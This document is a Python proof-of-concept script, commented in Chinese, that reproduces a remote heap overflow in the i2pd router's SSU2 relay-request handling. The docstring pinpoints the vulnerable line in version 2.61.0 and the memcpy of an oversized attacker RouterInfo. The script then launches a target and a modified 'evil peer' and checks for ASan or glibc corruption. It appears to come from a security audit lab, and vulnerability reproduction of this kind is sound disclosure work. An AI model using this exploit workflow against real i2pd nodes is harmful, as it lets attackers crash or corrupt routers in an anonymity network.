#!/usr/bin/env python3
"""
VULN-01 PoC — i2pd SSU2 HandleRelayRequest 远程堆溢出一键复现
漏洞: libi2pd/SSU2Session.cpp:2261 (2.61.0)  m_MaxPayloadSize - len - 32 无符号下溢
      → CreateRouterInfoBlock memcpy 攻击者可控 RI (~2600B) 进 1500B SSU2SentPacket::payload
用法: python3 poc_b5.py [asan|pristine|distro]
前置: 首次运行自动构建三档目标与 evil peer (需 clang/openssl/boost, 脚本自动配用户级工具链)
判定: 目标进程在攻击后死亡 + (asan 档) heap-buffer-overflow WRITE 报告 → 复现成功
"""
import os, sys, time, subprocess, shutil, re

AUDIT = '/home/z/my-project/audit'
BUILDS = f'{AUDIT}/builds'
FLAVOR = sys.argv[1] if len(sys.argv) > 1 else 'asan'
LAB = f'{BUILDS}/lab-b5-{FLAVOR}'
IP = '21.0.19.150'

def sh(cmd, **kw):
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True, **kw)
    return r.returncode, r.stdout + r.stderr

def prereq():
    for f in [f'{BUILDS}/{FLAVOR}/i2pd', f'{BUILDS}/evil/i2pd']:
        if not os.path.exists(f):
            print(f'[*] 缺少 {f}, 请先运行审计环境构建脚本 (build_one.sh / evil_patches.py)')
            sys.exit(2)

def main():
    prereq()
    sh('pkill -f "audit/builds/.*i2pd"; sleep 2; pkill -9 -f "audit/builds/.*i2pd"; sleep 1')
    shutil.rmtree(LAB, ignore_errors=True)
    os.makedirs(f'{LAB}/target', exist_ok=True)
    os.makedirs(f'{LAB}/evil', exist_ok=True)

    open(f'{LAB}/target.conf', 'w').write(
        f'loglevel = info\nhost = {IP}\n[reseed]\nurls =\n[ssu2]\nport = 17777\n'
        f'[http]\naddress = 127.0.0.1\nport = 7070\n')
    open(f'{LAB}/evil.conf', 'w').write(
        f'loglevel = info\nhost = {IP}\n[reseed]\nurls =\n[ssu2]\nport = 27777\n'
        f'[ntcp2]\nenabled = false\n[http]\naddress = 127.0.0.1\nport = 17070\n')

    print(f'[*] 启动目标 ({FLAVOR} 档, 未修改源码构建)')
    env = dict(os.environ, ASAN_OPTIONS='detect_leaks=0:abort_on_error=1:symbolize=1')
    target = subprocess.Popen([f'{BUILDS}/{FLAVOR}/i2pd', f'--datadir={LAB}/target',
        f'--conf={LAB}/target.conf'], stdout=open(f'{LAB}/target.log', 'w'),
        stderr=subprocess.STDOUT, env=env)
    for _ in range(40):
        if 'Start listening' in open(f'{LAB}/target.log', errors='replace').read(): break
        time.sleep(1)
    assert os.path.exists(f'{LAB}/target/router.info'), '目标 router.info 未生成'

    print('[*] 启动攻击方 (evil peer: RelayTagRequest + 2600B 填充 RI + 恶意 RelayRequest)')
    evil_env = dict(env, EVIL_ATTACK='1', EVIL_PAD='1',
                    EVIL_TARGET_RI=f'{LAB}/target/router.info')
    evil = subprocess.Popen([f'{BUILDS}/evil/i2pd', f'--datadir={LAB}/evil',
        f'--conf={LAB}/evil.conf'], stdout=open(f'{LAB}/evil.log', 'w'),
        stderr=subprocess.STDOUT, env=evil_env)

    crash, t = False, 0
    while t < 120:
        if target.poll() is not None:
            crash = True
            break
        time.sleep(1); t += 1

    evil.terminate()
    log = open(f'{LAB}/target.log', errors='replace').read()
    evil_log = open(f'{LAB}/evil.log', errors='replace').read()
    fired = 'firing malicious RelayRequest' in evil_log
    asan_hit = 'heap-buffer-overflow' in log and 'WRITE' in log
    glibc_hit = 'malloc(): invalid size' in log

    print(f'    攻击块已发射: {fired}')
    print(f'    目标进程死亡: {crash} (t+{t}s)')
    print(f'    ASan 堆溢出报告: {asan_hit} | glibc 堆元数据破坏: {glibc_hit}')
    if crash and (asan_hit or glibc_hit):
        m = re.search(r'WRITE of size (\d+)', log)
        size = m.group(1) if m else '?'
        print(f'\n[+] 复现成功 — VULN-01 SSU2 远程堆溢出 (越界写 {size} 字节, 内容=攻击者 RouterInfo)')
        print('[+] 证据: ' + f'{LAB}/target.log')
        return 0
    print('\n[-] 未复现 — 检查上方状态与日志')
    return 1

if __name__ == '__main__':
    sys.exit(main())
